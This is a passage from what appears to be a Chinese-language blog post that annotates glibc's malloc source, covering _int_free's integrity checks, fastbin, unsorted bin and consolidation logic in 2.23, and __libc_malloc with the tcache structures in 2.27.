nextchunk is used（若下个chunk正在被使用，就为true） */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk（紧邻的上个chunk大小） */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking （用于临时链接的临时变量）*/</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<span class="hljs-comment">//获取当前chunk大小</span><br><br></code></pre></td></tr></table></figure><h3 id="安全检查："><a href="#安全检查：" class="headerlink" title="安全检查："></a>安全检查：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">     allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">     Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">     here by accident or by &quot;design&quot; from some intruder.  */</span><br><span class="hljs-comment">/* 一个不会影响性能的小型安全检查：分配器永远不会在地址空间的末尾回绕。因此，我们可以排除一些可能偶然出现或被“设计”出来的大小值，这些值可能来自某些入侵者。 */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<span class="hljs-comment">//指针是否合法||内存块地址是否符合对其要求</span><br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>  <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">     multiple of MALLOC_ALIGNMENT.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<span class="hljs-comment">//内存块大小&lt;MINSIZE||内存块大小是否符合对其要求</span><br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br>  check_inuse_chunk(av, p);<span class="hljs-comment">//检查内存块是否正在使用</span><br></code></pre></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<span class="hljs-comment">//看是否在fastbin范围内</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">如果定义了 TRIM_FASTBINS，不要将紧邻 top chunk 的 chunk 放入 fastbins。</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<span class="hljs-comment">//检查洗一个chunk大小是不是&lt;=2*SIZE_SZ</span><br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<span class="hljs-comment">//或大于分配区总内存</span><br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<span class="hljs-comment">//获取锁，重新检查</span><br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<span class="hljs-comment">//释放锁</span><br>  &#123;<br>    (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>    set_fastchunks(av);<span class="hljs-comment">//设置标志，表示分配区中有fastbin</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<span class="hljs-comment">//根据chunk大小计算对应fastbin索引</span><br>    fb = &amp;fastbin (av, idx);<span class="hljs-comment">//获取分配区第idx个fastbin的指针</span><br><br>    <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>     <span class="hljs-comment">//原子操作将chunk插入fastbin</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>    <span class="hljs-keyword">do</span><br>      &#123;<br><span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">   (i.e., double free).  */</span><br>         <span class="hljs-comment">/* 检查 fastbin 的顶部是否是当前要插入的 chunk（即双重释放）。 */</span><br><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">   size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">   only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>         <span class="hljs-comment">//检查fastbin顶部chunk大小是否与当前chunk大小一致</span><br><span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>  old_idx = fastbin_index(chunksize(old));<br>p-&gt;fd = old2 = old;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<span class="hljs-comment">//检查fastbin顶部chunk大小</span><br>      &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="继续检查"><a href="#继续检查" class="headerlink" title="继续检查"></a>继续检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-comment">//检查是否要对非mmap内存块合并</span><br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>   <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>     (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<span class="hljs-comment">//尝试获取分配区的锁</span><br>     locked = <span class="hljs-number">1</span>;<br>   &#125;<br><br>   nextchunk = chunk_at_offset(p, size);<span class="hljs-comment">//获取下个chunk地址</span><br><br>   <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">      top block.  */</span><br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<span class="hljs-comment">//检查当前内存块是不是分配区的topchunk</span><br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>      <span class="hljs-comment">//检查下个chunk是不是超出分配区的边界</span><br>   <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>      <span class="hljs-comment">//检查下个快的‘前一块是否使用标志位’设置没</span><br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>      <span class="hljs-comment">//检查下个快的大小（&lt;MINSIZE或&gt;分配区总内存大小）</span><br>   nextsize = chunksize(nextchunk);<br>   <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>   free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<span class="hljs-comment">//释放内存块内容</span><br></code></pre></td></tr></table></figure><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br>       <span class="hljs-comment">//向背后那个chunk合并</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) <span class="hljs-comment">//若前一个chunk空闲，则将当前chunk与前个chunk合并</span><br>    &#123;<br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<span class="hljs-comment">//更新size</span><br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<span class="hljs-comment">//更新当前chunk指针为前一个chunk地址</span><br>      unlink(av, p, bck, fwd);<span class="hljs-comment">//将前个chunk移除链表</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">/* get and clear inuse bit */</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="hljs-comment">//获取下个chunk的使用位</span><br><br>      <span class="hljs-comment">/* consolidate forward */</span><br>         <span class="hljs-comment">//向前面的chunk合并</span><br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>unlink(av, nextchunk, bck, fwd);<br>size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h3 id="unsorted-bin-1"><a href="#unsorted-bin-1" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">not placed into regular bins until after they have</span><br><span class="hljs-comment">been given one chance to be used in malloc.</span><br><span class="hljs-comment">      */</span><br><br>      bck = unsorted_chunks(av);<span class="hljs-comment">//将chunk放入unsorted bin</span><br>      fwd = bck-&gt;fd;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<span class="hljs-comment">//检查双向链表有没被破坏</span><br>&#123;<br>  errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>  <span class="hljs-keyword">goto</span> errout;<br>&#125;<br>      <span class="hljs-comment">//将释放的内存块p插入unsorted bin链表</span><br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<span class="hljs-comment">//如果是在largebin范围内就设置特有的两个指针</span><br>&#123;<br>  p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>  p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>&#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<span class="hljs-comment">//设置头，脚部信息</span><br><br>      check_free_chunk(av, p);<span class="hljs-comment">//检查内存块状态</span><br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">      consolidate into top</span><br><span class="hljs-comment">    */</span><br><span class="hljs-comment">//如果内存块与top chunk相邻，就合并到top chunk</span><br>    <span class="hljs-keyword">else</span> &#123;<br>      size += nextsize;<br>      set_head(p, size | PREV_INUSE);<br>      av-&gt;top = p;<br>      check_chunk(av, p);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="整理堆"><a href="#整理堆" class="headerlink" title="整理堆"></a>整理堆</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">      chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">      threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">      bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">      has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">      is reached.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) <span class="hljs-comment">//当前释放的大小超过FASTBIN_CONSOLIDATION_THRESHOLD进入分支</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>malloc_consolidate(av);<span class="hljs-comment">//合并fastbin中内存块</span><br><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena)<span class="hljs-comment">//看是否要修剪top chunk </span><br>      &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<span class="hljs-comment">//看top chunk是不是超过了修剪阈值</span><br>  systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span><span class="hljs-comment">//对于非主分配区 </span><br>      &#123;<br><span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">   large, because the corresponding heap might go away.  */</span><br>           <span class="hljs-comment">/* 即使顶部块不大，也尝试调用 heap_trim()，因为对应的堆可能会被释放。 */</span><br>heap_info *heap = heap_for_ptr(top(av));<br><br>assert(heap-&gt;ar_ptr == av);<br>heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<span class="hljs-comment">//释放锁</span><br>  &#125;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk was allocated via mmap, release via munmap().</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<span class="hljs-comment">//释放由mmap分配的内存</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h1><h2 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<span class="hljs-comment">//钩子函数</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//编译时宏，用于启用线程缓存机制</span></span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes;<br>  checked_request2size (bytes, tbytes);<span class="hljs-comment">//将请求大小转换为实际分配的大小</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<span class="hljs-comment">//单线程</span><br>    &#123;<br>      victim = _int_malloc (&amp;main_arena, bytes);<br>      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));<br>      <span class="hljs-keyword">return</span> victim;<br>    &#125;<br><br>  arena_get (ar_ptr, bytes);<span class="hljs-comment">//多线程</span><br><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br>libc_hidden_def (__libc_malloc)<br></code></pre></td></tr></table></figure><p>可以看到与2.23相比最大的变化就是多了teache，下面就来详细地看一下这一部分的源码</p><h2 id="teache"><a href="#teache" class="headerlink" title="teache"></a>teache</h2><h3 id="teache结构体"><a href="#teache结构体" class="headerlink" title="teache结构体"></a>teache结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-comment">/* 当一个内存块（chunk）存储在线程本地缓存（per-thread cache）中时，</span><br><span class="hljs-comment">   我们将这个结构体覆盖在内存块的用户数据部分。 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span>//用于管理空闲<span class="hljs-title">chunk</span>的结构体</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向下一个空闲chunk</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span 